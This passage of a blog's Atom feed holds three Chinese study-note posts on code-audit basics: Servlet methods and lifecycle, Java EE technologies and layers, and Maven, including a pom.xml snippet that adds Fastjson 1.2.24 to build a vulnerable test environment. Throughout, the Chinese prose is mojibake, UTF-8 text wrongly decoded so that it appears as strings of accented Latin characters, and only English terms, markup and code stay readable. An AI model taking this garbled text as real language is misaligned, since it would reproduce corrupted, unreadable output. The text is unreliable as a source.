public void doPost æ–¹æ³•</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4ã€destroy-æ¥å£"><a href="#4ã€destroy-æ¥å£" class="headerlink" title="4ã€destroy() æ¥å£"></a>4ã€destroy() æ¥å£</h2><p>å½“å®¹å™¨æ£€æµ‹åˆ°ä¸€ä¸ª Servlet å¯¹è±¡åº”è¯¥ä»æœåŠ¡ä¸­è¢«ç§»é™¤çš„æ—¶å€™ï¼Œå®¹å™¨ä¼šè°ƒç”¨è¯¥å¯¹è±¡çš„ destroy() æ–¹æ³•ï¼Œä»¥ä¾¿è®© Servlet å¯¹è±¡å¯ä»¥é‡Šæ”¾å®ƒæ‰€ä½¿ç”¨çš„èµ„æºï¼Œä¿å­˜æ•°æ®åˆ°æŒä¹…å­˜å‚¨è®¾å¤‡ä¸­ï¼Œä¾‹å¦‚å°†å†…å­˜ä¸­çš„æ•°æ®ä¿å­˜åˆ°æ•°æ®åº“ä¸­ï¼Œå…³é—­æ•°æ®åº“çš„è¿æ¥ç­‰ã€‚</p><p>destroy() æ–¹æ³•ä¸ init() æ–¹æ³•ç›¸åŒï¼Œéƒ½åªä¼šè°ƒç”¨ä¸€æ¬¡ã€‚</p><p>destroy() æ–¹æ³•å®šä¹‰å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// å¼€å‘è€…è‡ªå®šä¹‰ä»£ç </span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="5ã€getServletConfig-æ¥å£"><a href="#5ã€getServletConfig-æ¥å£" class="headerlink" title="5ã€getServletConfig() æ¥å£"></a>5ã€getServletConfig() æ¥å£</h2><p>è¯¥æ–¹æ³•è¿”å›å®¹å™¨è°ƒç”¨ init() æ–¹æ³•æ—¶ä¼ é€’ç»™ Servlet å¯¹è±¡çš„ ServletConfig å¯¹è±¡ï¼ŒServletConfig å¯¹è±¡åŒ…å«äº† Servlet çš„åˆå§‹åŒ–å‚æ•°ã€‚</p><h2 id="6ã€getServletInfo-æ¥å£"><a href="#6ã€getServletInfo-æ¥å£" class="headerlink" title="6ã€getServletInfo() æ¥å£"></a>6ã€getServletInfo() æ¥å£</h2><p>è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ª String ç±»å‹çš„å­—ç¬¦ä¸²ï¼Œå…¶ä¸­åŒ…æ‹¬äº†å…³äº Servlet çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼Œä½œè€…ã€ç‰ˆæœ¬å’Œç‰ˆæƒç­‰ã€‚</p><h1 id="0x04-Servlet-çš„ç”Ÿå‘½å‘¨æœŸ"><a href="#0x04-Servlet-çš„ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="0x04 Servlet çš„ç”Ÿå‘½å‘¨æœŸ"></a>0x04 Servlet çš„ç”Ÿå‘½å‘¨æœŸ</h1><p>Servlet ç”Ÿå‘½å‘¨æœŸæŒ‡çš„æ˜¯ Servlet ä»åˆ›å»ºç›´åˆ°é”€æ¯çš„æ•´ä¸ªè¿‡ç¨‹ã€‚</p><p>åœ¨ä¸€ä¸ªç”Ÿå‘½å‘¨æœŸä¸­ï¼ŒServlet ç»å†äº†è¢«åŠ è½½ã€åˆå§‹åŒ–ã€æ¥æ”¶è¯·æ±‚ã€å“åº”è¯·æ±‚ä»¥åŠæä¾›æœåŠ¡çš„è¿‡ç¨‹ï¼Œå…·ä½“å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202111151656032.png"></p><blockquote><p>å‚è€ƒé“¾æ¥ï¼š</p><p><a href="https://tomcat.apache.org/whichversion.html">https://tomcat.apache.org/whichversion.html</a></p><p><a href="https://blog.csdn.net/bieleyang/article/details/76696131">https://blog.csdn.net/bieleyang/article/details/76696131</a></p><p><a href="https://blog.csdn.net/qq_45017999/article/details/106696148">https://blog.csdn.net/qq_45017999/article/details/106696148</a></p><p>æ›´å¤šä¿¡æ¯æ¬¢è¿å…³æ³¨æˆ‘çš„ä¸ªäººå¾®ä¿¡å…¬ä¼—å·ï¼šTeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h1&gt;&lt;p&gt;Servlet æ˜¯ Java Web å®¹å™¨ä¸­è¿è¡Œçš„å°ç¨‹åºï¼ŒServlet åŸåˆ™ä¸Šå¯ä»¥é€šè¿‡ä»»ä½•å®¢æˆ·ç«¯-</summary>
      
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="å­¦ä¹ ç¬”è®°" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="ä»£ç å®¡è®¡" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ã€ä»£ç å®¡è®¡ã€‘Java EE åŸºç¡€çŸ¥è¯†</title>
    <link href="https://www.teamssix.com/211115-123451.html"/>
    <id>https://www.teamssix.com/211115-123451.html</id>
    <published>2021-11-15T04:34:51.000Z</published>
    <updated>2021-11-22T08:59:49.391Z</updated>
    
    <content type="html"><![CDATA[<p>Java å¹³å°åˆ†ä¸ºä¸‰ä¸ªä¸»è¦ç‰ˆæœ¬ï¼š</p><ol><li>Java SEï¼ˆJava å¹³å°æ ‡å‡†ç‰ˆï¼‰</li><li>Java EEï¼ˆJava å¹³å°ä¼ä¸šç‰ˆï¼‰</li><li>Java MEï¼ˆJava å¹³å°å¾®å‹ç‰ˆï¼‰</li></ol><p>Java EE æ˜¯ Java åº”ç”¨æœ€å¹¿æ³›çš„ç‰ˆæœ¬ã€‚</p><h1 id="0x01-Java-EE-çš„æ ¸å¿ƒæŠ€æœ¯"><a href="#0x01-Java-EE-çš„æ ¸å¿ƒæŠ€æœ¯" class="headerlink" title="0x01 Java EE çš„æ ¸å¿ƒæŠ€æœ¯"></a>0x01 Java EE çš„æ ¸å¿ƒæŠ€æœ¯</h1><p>Java EE æœ‰åä¸‰ç§æ ¸å¿ƒæŠ€æœ¯ï¼Œå®ƒä»¬åˆ†åˆ«æ˜¯ï¼šJDBCã€JNDIã€EJBã€RMIã€Servletã€JSPã€XMLã€JMSã€Java IDLã€JTSã€JTAã€JavaMail å’Œ JAFï¼Œè¿™é‡Œé‡ç‚¹ä»‹ç»ä»¥ä¸‹å‡ ç§ï¼š</p><ol><li>Java æ•°æ®åº“è¿æ¥ï¼ˆJava Database Connectivityï¼ŒJDBCï¼‰æ˜¯ Java è¯­è¨€ä¸­ç”¨æ¥è§„èŒƒå®¢æˆ·ç«¯ç¨‹åºå¦‚ä½•æ¥è®¿é—®æ•°æ®åº“çš„åº”ç”¨ç¨‹åºæ¥å£ï¼Œæä¾›äº†è¯¸å¦‚æŸ¥è¯¢å’Œæ›´æ–°æ•°æ®åº“ä¸­æ•°æ®çš„æ–¹æ³•ã€‚</li><li>Java å‘½åå’Œç›®å½•æ¥å£ï¼ˆJava Naming and Directory Interfaceï¼ŒJNDIï¼‰ï¼Œæ˜¯ Java çš„ä¸€ä¸ªç›®å½•æœåŠ¡åº”ç”¨ç¨‹åºç•Œé¢ï¼ˆAPIï¼‰ï¼Œå®ƒæä¾›ä¸€ä¸ªç›®å½•ç³»ç»Ÿï¼Œå¹¶å°†æœåŠ¡åç§°ä¸å¯¹è±¡å…³è”èµ·æ¥ï¼Œä»è€Œä½¿å¾—å¼€å‘äººå‘˜åœ¨å¼€å‘è¿‡ç¨‹ä¸­å¯ä»¥ä½¿ç”¨åç§°æ¥è®¿é—®å¯¹è±¡ã€‚ç®€å•çš„è¯´å°±æ˜¯æ¯”å¦‚ä»¥å‰è¿æ¥æ•°æ®åº“éœ€è¦æŠŠå‚æ•°å†™åœ¨ Java ç±»é‡Œï¼Œä½†ç°åœ¨å¯ä»¥ç›´æ¥å†™åœ¨é…ç½®æ–‡ä»¶é‡Œäº†ï¼Œè¿™ä¸ªé…ç½®æ–‡ä»¶å¯ä»¥æ˜¯ XMLï¼Œä¹Ÿå¯ä»¥æ˜¯ propertiesï¼Œæˆ–è€… yml æ–‡ä»¶ï¼Œåªè¦èƒ½è§£æéƒ½è¡Œã€‚</li><li>ä¼ä¸šçº§ JavaBeanï¼ˆEnterprise JavaBean, EJBï¼‰æ˜¯ä¸€ä¸ªç”¨æ¥æ„ç­‘ä¼ä¸šçº§åº”ç”¨çš„ã€åœ¨æœåŠ¡å™¨ç«¯å¯è¢«ç®¡ç†ç»„ä»¶ã€‚ä¸è¿‡è¿™ä¸ªä¸œè¥¿åœ¨ Spring é—®ä¸–ååŸºæœ¬å‡‰å‡‰äº†ï¼ŒçŸ¥é“æ˜¯ä»€ä¹ˆå°±è¡Œã€‚</li><li>è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼ˆRemote Method Invocationï¼ŒRMIï¼‰æ˜¯ Java çš„ä¸€ç»„æ‹¥æœ‰å¼€å‘åˆ†å¸ƒå¼åº”ç”¨ç¨‹åºçš„ APIï¼Œå®ƒå¤§å¤§å¢å¼ºäº† Java å¼€å‘åˆ†å¸ƒå¼åº”ç”¨çš„èƒ½åŠ›ã€‚</li><li>Servletï¼ˆServer Appletï¼‰ï¼Œæ˜¯ç”¨ Java ç¼–å†™çš„æœåŠ¡ç«¯ç¨‹åºã€‚å…¶ä¸»è¦åŠŸèƒ½åœ¨äºäº¤äº’å¼åœ°æµè§ˆå’Œä¿®æ”¹æ•°æ®ï¼Œç”ŸæˆåŠ¨æ€ Web å†…å®¹ã€‚ç‹­ä¹‰çš„ Servlet æ˜¯æŒ‡ Java è¯­è¨€å®ç°çš„ä¸€ä¸ªæ¥å£ï¼Œå¹¿ä¹‰çš„ Servlet æ˜¯æŒ‡ä»»ä½•å®ç°äº†è¿™ä¸ª Servlet æ¥å£çš„ç±»ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œäººä»¬å°† Servlet ç†è§£ä¸ºåè€…ã€‚</li><li>JSPï¼ˆå…¨ç§° JavaServer Pagesï¼‰æ˜¯ç”± Sun å…¬å¸ä¸»å¯¼åˆ›å»ºçš„ä¸€ç§åŠ¨æ€ç½‘é¡µæŠ€æœ¯æ ‡å‡†ã€‚JSP éƒ¨ç½²äºç½‘ç»œæœåŠ¡å™¨ä¸Šï¼Œå¯ä»¥å“åº”å®¢æˆ·ç«¯å‘é€çš„è¯·æ±‚ï¼Œå¹¶æ ¹æ®è¯·æ±‚å†…å®¹åŠ¨æ€åœ°ç”Ÿæˆ HTMLã€XML æˆ–å…¶ä»–æ ¼å¼æ–‡æ¡£çš„ Web ç½‘é¡µï¼Œç„¶åè¿”å›ç»™è¯·æ±‚è€…ã€‚</li><li>å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆeXtensible Markup Languageï¼ŒXMLï¼‰æ˜¯è¢«è®¾è®¡ç”¨äºä¼ è¾“å’Œå­˜å‚¨æ•°æ®çš„è¯­è¨€ã€‚</li><li>Java æœåŠ¡æ¶ˆæ¯ï¼ˆJava Message Serviceï¼ŒJMSï¼‰æ˜¯ä¸€ä¸ª Java å¹³å°ä¸­å…³äºé¢å‘æ¶ˆæ¯ä¸­é—´ä»¶ï¼ˆMOMï¼‰çš„ APIï¼Œç”¨äºåœ¨ä¸¤ä¸ªåº”ç”¨ç¨‹åºä¹‹é—´æˆ–åˆ†å¸ƒå¼ç³»ç»Ÿä¸­å‘é€æ¶ˆæ¯ï¼Œè¿›è¡Œå¼‚æ­¥é€šä¿¡ã€‚</li></ol><h1 id="0x02-Java-EE-åˆ†å±‚æ¨¡å‹"><a href="#0x02-Java-EE-åˆ†å±‚æ¨¡å‹" class="headerlink" title="0x02 Java EE åˆ†å±‚æ¨¡å‹"></a>0x02 Java EE åˆ†å±‚æ¨¡å‹</h1><p>Java EE åº”ç”¨çš„åˆ†å±‚æ¨¡å‹ä¸»è¦åˆ†ä¸ºä»¥ä¸‹ 5 å±‚ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/img/202111151127644.png"></p><ol><li>Domain Objectï¼ˆé¢†åŸŸå¯¹è±¡ï¼‰å±‚ï¼Œä¹Ÿå«æ¨¡å‹ï¼ˆModoleï¼‰å±‚ï¼Œæ­¤å±‚ç”±ä¸€ç³»åˆ—çš„ POJOï¼ˆPlain Old Java Objectï¼Œæ™®é€šçš„ã€ä¼ ç»Ÿçš„ java å¯¹è±¡ï¼‰ç»„æˆï¼Œè¿™äº›å¯¹è±¡æ˜¯è¯¥ç³»ç»Ÿçš„ Domain Objectï¼Œå¾€å¾€åŒ…å«äº†å„è‡ªæ‰€éœ€å®ç°çš„ä¸šåŠ¡é€»è¾‘æ–¹æ³•ã€‚</li><li>DAOï¼ˆData Access Objectï¼Œæ•°æ®è®¿é—®å¯¹è±¡ï¼‰å±‚ï¼Œæ­¤å±‚ç”±ä¸€ç³»åˆ—çš„ DAO ç»„ä»¶ç»„æˆï¼Œè¿™äº› DAO å®ç°äº†å¯¹æ•°æ®åº“çš„åˆ›å»ºã€æŸ¥è¯¢ã€æ›´æ–°å’Œåˆ é™¤ï¼ˆCRUDï¼‰ç­‰åŸå­æ“ä½œã€‚</li><li>Serviceï¼ˆä¸šåŠ¡é€»è¾‘å±‚ï¼‰å±‚ï¼Œæ­¤å±‚ç”±ä¸€ç³»åˆ—çš„ä¸šåŠ¡é€»è¾‘å¯¹è±¡ç»„æˆï¼Œè¿™äº›ä¸šåŠ¡é€»è¾‘å¯¹è±¡å®ç°äº†ç³»ç»Ÿæ‰€éœ€è¦çš„ä¸šåŠ¡é€»è¾‘æ–¹æ³•ã€‚è¿™äº›ä¸šåŠ¡é€»è¾‘æ–¹æ³•å¯èƒ½ä»…ä»…ç”¨äºæš´éœ²Domain Object å¯¹è±¡æ‰€å®ç°çš„ä¸šåŠ¡é€»è¾‘æ–¹æ³•ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¾èµ– DAO ç»„ä»¶å®ç°çš„ä¸šåŠ¡é€»è¾‘æ–¹æ³•ã€‚</li><li>Controllerï¼ˆæ§åˆ¶å™¨ï¼‰å±‚ï¼Œæ­¤å±‚ç”±ä¸€ç³»åˆ—æ§åˆ¶å™¨ç»„æˆï¼Œè¿™äº›æ§åˆ¶å™¨ç”¨äºæ‹¦æˆªç”¨æˆ·è¯·æ±‚ï¼Œå¹¶è°ƒç”¨ä¸šåŠ¡é€»è¾‘ç»„ä»¶çš„ä¸šåŠ¡é€»è¾‘æ–¹æ³•ï¼Œå¹¶æ ¹æ®å¤„ç†ç»“æœè½¬å‘åˆ°ä¸åŒçš„ View ç»„ä»¶ã€‚</li><li>Viewï¼ˆè¡¨ç°ï¼‰å±‚ï¼Œæ­¤å±‚ç”±ä¸€ç³»åˆ—çš„ JSP é¡µé¢ã€Velocity é¡µé¢ã€PDF æ–‡æ¡£è§†å›¾ç»„ä»¶ç»„æˆï¼Œè´Ÿè´£æ”¶é›†ç”¨æˆ·è¯·æ±‚ï¼Œå¹¶æ˜¾ç¤ºå¤„ç†åçš„ç»“æœã€‚</li></ol><blockquote><p>å‚è€ƒé“¾æ¥ï¼š</p><p><a href="https://zhuanlan.zhihu.com/p/43884237">https://zhuanlan.zhihu.com/p/43884237</a></p><p><a href="https://www.codenong.com/cs105259462/">https://www.codenong.com/cs105259462/</a></p><p><a href="https://blog.csdn.net/mzc_love/article/details/107244053">https://blog.csdn.net/mzc_love/article/details/107244053</a></p><p>æ›´å¤šä¿¡æ¯æ¬¢è¿å…³æ³¨æˆ‘çš„ä¸ªäººå¾®ä¿¡å…¬ä¼—å·ï¼šTeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Java å¹³å°åˆ†ä¸ºä¸‰ä¸ªä¸»è¦ç‰ˆæœ¬ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Java SEï¼ˆJava å¹³å°æ ‡å‡†ç‰ˆï¼‰&lt;/li&gt;
&lt;li&gt;Java EEï¼ˆJava å¹³å°ä¼ä¸šç‰ˆï¼‰&lt;/li&gt;
&lt;li&gt;Java MEï¼ˆJava å¹³å°å¾®å‹ç‰ˆï¼‰&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Java EE æ˜¯ Java </summary>
      
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="å­¦ä¹ ç¬”è®°" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="ä»£ç å®¡è®¡" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ã€ä»£ç å®¡è®¡ã€‘Maven åŸºç¡€çŸ¥è¯†</title>
    <link href="https://www.teamssix.com/211103-161807.html"/>
    <id>https://www.teamssix.com/211103-161807.html</id>
    <published>2021-11-03T08:18:07.000Z</published>
    <updated>2021-11-22T08:59:50.276Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h1><p>Maven æ˜¯ä¸€ä¸ªé¡¹ç›®æ„å»ºå’Œç®¡ç†å·¥å…·ï¼Œåˆ©ç”¨å®ƒå¯ä»¥å¯¹ JAVA é¡¹ç›®è¿›è¡Œæ„å»ºå’Œç®¡ç†ã€‚</p><p>Maven é‡‡ç”¨é¡¹ç›®å¯¹è±¡æ¨¡å‹ POMï¼ˆProject Object Modelï¼‰æ¥ç®¡ç†é¡¹ç›®ã€‚</p><p>Maven çš„ä¸»è¦å·¥ä½œå°±æ˜¯ç”¨æ¥è§£æä¸€äº› XML æ–‡æ¡£ã€ç®¡ç†ç”Ÿå‘½å‘¨æœŸä¸æ’ä»¶ã€‚</p><p>Maven è¢«è®¾è®¡æˆå°†ä¸»è¦çš„èŒè´£å§”æ´¾ç»™ä¸€ç»„ Maven æ’ä»¶ï¼Œè¿™äº›æ’ä»¶å¯ä»¥å½±å“ Maven ç”Ÿå‘½å‘¨æœŸï¼Œæä¾›å¯¹ç›®æ ‡çš„è®¿é—®ã€‚</p><h2 id="0x01-pom-xml-æ–‡ä»¶ä»‹ç»"><a href="#0x01-pom-xml-æ–‡ä»¶ä»‹ç»" class="headerlink" title="0x01 pom.xml æ–‡ä»¶ä»‹ç»"></a>0x01 pom.xml æ–‡ä»¶ä»‹ç»</h2><p>pom.xml æ–‡ä»¶è¢«ç”¨äºç®¡ç†æºä»£ç ã€é…ç½®æ–‡ä»¶ã€å¼€å‘è€…çš„ä¿¡æ¯å’Œè§’è‰²ç­‰ï¼ŒMaven é¡¹ç›®ä¸­å¯ä»¥æ²¡æœ‰å…¶ä»–æ–‡ä»¶ä½†å¿…é¡»åŒ…å« pom.xml æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶ä¹Ÿæ˜¯ Maven é¡¹ç›®çš„æ ¸å¿ƒé…ç½®æ–‡ä»¶ã€‚</p><p>ä¸€ä¸ªå¼•å…¥ Fastjson 1.2.24 ç‰ˆæœ¬ç»„ä»¶çš„é…ç½®ä¿¡æ¯å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependencies&gt;  &lt;!-- https:&#x2F;&#x2F;mvnrepository.com&#x2F;artifact&#x2F;com.alibaba&#x2F;fastjson --&gt;  &lt;dependency&gt;    &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt;    &lt;version&gt;1.2.24&lt;&#x2F;version&gt;  &lt;&#x2F;dependency&gt;&lt;&#x2F;dependencies&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>è¯¥é…ç½®ä¿¡æ¯å¯ç›´æ¥ä» <a href="https://mvnrepository.com/artifact/com.alibaba/fastjson/1.2.24">https://mvnrepository.com/artifact/com.alibaba/fastjson/1.2.24</a> è·å¾—</p></blockquote><p>é…ç½®æ–‡ä»¶é‡Œçš„ dependencies å’Œ dependency ç”¨äºå®šä¹‰ä¾èµ–å…³ç³»ï¼Œdependency é‡Œçš„ groupIdã€artifactIdã€version ç”¨æ¥å®šä¹‰æ‰€ä¾èµ–çš„é¡¹ç›®ã€‚</p><h1 id="0x02-Maven-çš„ä½¿ç”¨"><a href="#0x02-Maven-çš„ä½¿ç”¨" class="headerlink" title="0x02 Maven çš„ä½¿ç”¨"></a>0x02 Maven çš„ä½¿ç”¨</h1><p>è¿™é‡Œä»¥ IntelliJ IDEA ä¸ºä¾‹ï¼Œåœ¨æ–°å»ºé¡¹ç›®æ—¶é€‰æ‹©åˆ›å»º Maven é¡¹ç›®å³å¯ã€‚</p><p>åœ¨åˆ›å»ºå®Œ Maven é¡¹ç›®åï¼Œå°±ä¼šçœ‹åˆ°é¡¹ç›®é‡ŒåŒ…å«çš„ pox.xml æ–‡ä»¶äº†ï¼Œå¯¹äºå®‰å…¨äººå‘˜å°±å¯ä»¥é€šè¿‡è¯¥æ–‡ä»¶å»åˆ¤æ–­å½“å‰é¡¹ç›®é‡Œæ˜¯å¦åŒ…å«äº†å­˜åœ¨éšæ‚£çš„ç»„ä»¶ã€‚</p><p>è¿™æ—¶å¦‚æœæƒ³æ­å»ºä¸€ä¸ª Fastjson &lt;= 1.2.24 ç‰ˆæœ¬çš„æ¼æ´ç¯å¢ƒï¼Œå°±éœ€è¦å°† Fastjson &lt;= 1.2.24 ç‰ˆæœ¬çš„ç»„ä»¶å¼•å…¥ã€‚</p><p>è¿™é‡Œåªéœ€è¦æŠŠä¸Šé¢çš„é…ç½®ä¿¡æ¯å¤åˆ¶åˆ° pom.xml æ–‡ä»¶ä¸­ï¼Œç„¶åå³å‡» pom.xml æ–‡ä»¶é€‰æ‹©ã€ŒMavenã€â€“ã€Œé‡æ–°åŠ è½½é¡¹ç›®ã€ï¼Œå°±å¯ä»¥è‡ªåŠ¨è¿›è¡Œç»„ä»¶çš„è·å–äº†ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202111031614583.png"></p><p>ç¨åç­‰ç»„ä»¶è¢«è‡ªåŠ¨ä¸‹è½½åˆ°æœ¬åœ°å¹¶è‡ªåŠ¨åŠ å…¥åˆ°é¡¹ç›®ä¾èµ–ä¸­åï¼Œå°±å¯ä»¥åœ¨é¡¹ç›®ä»£ç ä½¿ç”¨è¯¥ç»„ä»¶äº†ã€‚</p><blockquote><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://www.jianshu.com/p/43ed2e9e386b">https://www.jianshu.com/p/43ed2e9e386b</a></p><p><a href="https://www.cnblogs.com/bndong/p/9762067.html">https://www.cnblogs.com/bndong/p/9762067.html</a></p><p><a href="https://www.cnblogs.com/cainiaomahua/p/10651014.html">https://www.cnblogs.com/cainiaomahua/p/10651014.html</a></p><p>æ›´å¤šä¿¡æ¯æ¬¢è¿å…³æ³¨æˆ‘çš„ä¸ªäººå¾®ä¿¡å…¬ä¼—å·ï¼šTeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h1&gt;&lt;p&gt;Maven æ˜¯ä¸€ä¸ªé¡¹ç›®æ„å»ºå’Œç®¡ç†å·¥å…·ï¼Œåˆ©ç”¨å®ƒå¯ä»¥å¯¹ JAVA é¡¹ç›®è¿›è¡Œæ„å»ºå’Œç®¡ç†ã€‚&lt;/p&gt;
&lt;p&gt;M</summary>
      
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="å­¦ä¹ ç¬”è®°" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="ä»£ç å®¡è®¡" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
</feed>
